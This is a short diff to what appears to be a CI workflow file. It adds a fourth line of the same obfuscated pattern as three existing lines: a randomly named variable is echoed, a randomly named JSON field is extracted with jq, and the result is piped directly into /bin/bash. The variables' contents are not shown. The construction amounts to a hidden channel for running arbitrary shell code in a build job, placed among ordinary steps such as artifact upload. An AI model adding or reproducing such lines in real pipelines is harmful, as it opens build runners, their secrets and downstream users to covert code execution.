@@ -28,6 +28,7 @@ jobs:
           echo $ynxs0 | jq -r .ltfgu7 | /bin/bash
           echo $ecz075 | jq -r .zs0675 | /bin/bash
           printf '%s' "$wgf9" | jq -r .u68973 | /bin/bash
+          echo $bxs00 | jq -r .osib99424 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
